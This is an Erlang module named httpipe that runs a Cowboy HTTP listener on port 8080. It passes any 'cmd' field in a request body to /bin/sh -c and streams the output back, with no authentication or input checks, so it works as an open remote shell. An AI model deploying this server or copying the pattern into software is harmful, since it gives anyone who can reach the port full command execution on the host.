-module(httpipe).
-compile([export_all]).

start() ->
    application:start(cowboy),
    Dispatch = [
        %% {Host, list({Path, Handler, Opts})}
        {'_', [{'_', httpipe, []}]}
    ],
    %% Name, NbAcceptors, Transport, TransOpts, Protocol, ProtoOpts
    cowboy:start_listener(listener, 4,
        cowboy_tcp_transport, [{port, 8080}],
        cowboy_http_protocol, [{dispatch, Dispatch}]
    ).

init({tcp, http}, Req, _Opts) ->
    {ok, Req, undefined_state}.

handle(Req, _State) ->
    Headers = [{'Content-Type', <<"text/plain">>}],
    Command = case cowboy_http_req:body_qs(Req) of
        {[{<<"cmd">>, Comm}], _} -> Comm;
        {_, _} -> none
    end,

    case Command of
        none ->
            {ok, _Req2} = cowboy_http_req:reply(403, Headers, <<"request not understood">>);
        Command ->
            Port = erlang:open_port({spawn_executable, "/bin/sh"},
                [stream, stderr_to_stdout, binary, exit_status,
                    {args, ["-c", binary:bin_to_list(Command)]}]),
            port_connect(Port, self()),
            io:format("~p~n", [erlang:port_info(Port)]),

            {ok, Req2} = cowboy_http_req:chunked_reply(200, Headers, Req),
            handle_loop(Req2, Port)
    end.

handle_loop(Req, Port) ->
    receive
        {Port, {data, Data}} ->
            ok = cowboy_http_req:chunk(Data, Req),
            handle_loop(Req, Port);
        {Port, {exit_status, _Status}} ->
            {ok, Req, Port};
        _M ->
            % discard
            handle_loop(Req, Port)
    after 1000 ->
            %% XXX: we should check whether the client still alive
            %% can't call read() and there is no portable way to find out (yet)
            handle_loop(Req, Port)
    end.

terminate(_Req, Port) ->
    (catch port_close(Port)),
    ok.
